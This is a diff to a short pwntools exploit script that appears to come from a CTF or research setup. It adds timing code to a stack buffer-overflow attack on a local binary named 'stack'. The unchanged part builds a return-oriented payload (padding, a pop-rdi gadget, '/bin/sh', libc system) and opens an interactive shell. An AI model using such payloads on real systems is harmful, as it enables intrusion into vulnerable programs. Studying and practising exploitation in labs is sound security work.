@@ -1,9 +1,9 @@
 from pwn import *
-
+from time import time
 context.log_level = 'debug'
-
+st = time()
 #p = process("./stack")
-p = process("../../bin/tee sample.txt| LD_PRELOAD=../../bin/mmap_dump.so ./stack", shell=True)
+p = process("../../bin/tee sb.txt| LD_PRELOAD=../../bin/mmap_dump.so ./stack", shell=True)
 elf = ELF("./stack")
 libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
 
@@ -20,4 +20,6 @@ payload = 'a'*0x48 + p64(0x400763) + p64(sh) + p64(libc.symbols['system'])
 payload = payload.ljust(200, 'a')
 
 p.send(payload)
+et = time()
+print(et-st)
 p.interactive()
